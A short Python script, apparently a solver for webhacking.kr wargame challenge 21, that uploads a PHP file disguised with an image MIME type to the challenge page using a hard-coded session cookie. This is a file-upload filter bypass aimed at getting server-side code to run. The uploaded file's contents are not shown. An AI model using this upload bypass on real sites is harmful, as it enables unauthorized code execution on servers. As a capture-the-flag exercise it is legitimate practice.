import requests


url = "http://webhacking.kr/challenge/web/web-21/index.php"

headers = {
	"Origin": "http://webhacking.kr",
	#"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryHDFfkMEhINOnLTmd",
	"Cookie":"PHPSESSID=b2f4afe01ffbb827e31f86bff992b61d; oldzombie=1",
	"Host":"webhacking.kr"
}

files = {
	'file': ('test.php', open('test.php', 'rb'), 'image/jpeg')
}


req = requests.post(url, files=files, headers=headers)
print req.content

'''
---------------------------
-----------------------------
'''